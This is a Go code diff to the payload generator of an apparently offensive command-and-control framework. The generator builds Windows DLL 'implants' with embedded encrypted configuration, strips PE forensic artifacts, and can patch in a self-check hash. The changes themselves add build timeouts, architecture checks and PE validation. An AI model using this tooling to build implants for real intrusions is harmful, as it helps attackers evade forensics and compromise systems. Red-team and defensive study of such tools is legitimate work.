@@ -2,6 +2,7 @@ package payload
 
 import (
 	"bytes"
+	"context"
 	"fmt"
 	"os"
 	"os/exec"
@@ -83,7 +84,7 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
-	ldflags := buildLdflags(cfg, profile, "windows")
+	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")
 
 	outName := cfg.Filename
 	if outName == "" {
@@ -92,6 +93,7 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 	if !strings.HasSuffix(strings.ToLower(outName), ".dll") {
 		outName += ".dll"
 	}
+	outName = safeBuildFileName(outName)
 	outPath := filepath.Join(outputDir, outName)
 	if !filepath.IsAbs(outPath) {
 		if abs, err := filepath.Abs(outPath); err == nil {
@@ -112,17 +114,29 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
-	goarch := "amd64"
-	if cfg.Architecture == "arm64" {
-		goarch = "arm64"
+	goarch, err := resolveBuildArch("windows", cfg.Architecture)
+	if err != nil {
+		return "", err
 	}
-	if err := buildAgentBinaryDLL(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch); err != nil {
+	if err := buildAgentBinaryDLL(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch, blob, sKey); err != nil {
 		return "", err
 	}
 
 	// Strip PE forensic artifacts in every mode (garble does not clean them)
 	// and remove the Go-generated .h export header next to the DLL.
 	stripPEArtifacts(outPath)
+
+	if cfg.SelfCheck {
+		if err := patchSelfCheckHash(outPath); err != nil {
+			return "", err
+		}
+	}
+
+	// Fail loudly (rather than deliver a corrupt binary) if the produced DLL is
+	// malformed or the wrong architecture.
+	if err := validatePE(outPath, windowsMachine(goarch)); err != nil {
+		return "", fmt.Errorf("generated dll failed PE validation: %w", err)
+	}
 	hPath := strings.TrimSuffix(outPath, ".dll") + ".h"
 	os.Remove(hPath)
 
@@ -135,7 +149,10 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 
 // buildAgentBinaryDLL runs `go build -buildmode=c-shared` with CGO_ENABLED=1.
 // It checks for cross-compiler availability on non-Windows hosts.
-func buildAgentBinaryDLL(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch string) error {
+func buildAgentBinaryDLL(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch, configBlob, sConfigKey string) error {
+	if err := writeConfigInjectFile(workDir, configBlob, sConfigKey); err != nil {
+		return fmt.Errorf("write config inject file: %w", err)
+	}
 	if obfuscate {
 		return fmt.Errorf("garble obfuscation is not supported with -buildmode=c-shared; disable obfuscation for DLL builds")
 	}
@@ -145,7 +162,9 @@ func buildAgentBinaryDLL(goCmd, workDir, ldflags, outPath string, obfuscate bool
 	}
 
 	buildArgs := []string{"build", "-buildmode=c-shared"}
-	cmd := exec.Command(goCmd, append(buildArgs,
+	ctx, cancel := context.WithTimeout(context.Background(), buildTimeout)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, goCmd, append(buildArgs,
 		"-ldflags", ldflags,
 		"-o", outPath,
 		"-trimpath",
@@ -161,6 +180,9 @@ func buildAgentBinaryDLL(goCmd, workDir, ldflags, outPath string, obfuscate bool
 	var stderr bytes.Buffer
 	cmd.Stderr = &stderr
 	if err := cmd.Run(); err != nil {
+		if ctx.Err() == context.DeadlineExceeded {
+			return fmt.Errorf("go build (c-shared) timed out after %s: %w", buildTimeout, err)
+		}
 		return fmt.Errorf("go build (c-shared) failed: %w\n%s", err, stderr.String())
 	}
 	return nil
